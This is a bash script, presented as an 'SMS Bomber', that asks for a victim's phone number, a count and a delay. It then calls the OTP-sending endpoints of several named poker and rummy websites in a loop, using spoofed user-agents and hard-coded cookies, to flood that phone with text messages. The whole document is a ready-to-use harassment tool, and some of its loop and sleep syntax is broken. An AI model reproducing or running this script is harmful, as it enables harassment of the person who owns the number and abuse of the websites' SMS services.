#!/bin/bash
apt-get install figlet
banner()
{
  echo "+------------------------------------------+"
  printf "| %-40s |\n" "`date`"
  echo "|                                          |"
  printf "|`tput bold` %-40s `tput sgr0`|\n" "$@"
  echo "+------------------------------------------+"
}
figlet 0percent
banner "Starting the Bomber for you..."
echo Please enter the mobile number..
read phonen
echo Enter no of sms...
read nos
banner "Good to go..."
echo Delay between SMS...
read del
for x in {1..nos}
do
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://pokersaint.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
sleep del
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://pokerraj.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
sleep del
curl http://ftrpoker.com/smsc?PHONE=$phonen
sleep del
curl http://thespartanpoker.com/smsc?PHONE=$phonen
sleep del
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://chipbazar.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
sleep del
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phonen"
sleep del
curl http://chipbazar.com/SendOTP.asp?For=Phone&PhoneNo=$phonen
curl http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phonen
curl http://52redpoker.com/SendOTP.asp?For=Phone&PhoneNo=$phonen
curl http://52redrummy.com/SendOTP.asp?For=Phone&PhoneNo=$phonen
curl http://pokerraj.com/SendOTP.asp?For=Phone&PhoneNo=$phonen
done
banner "Finished Bombing"
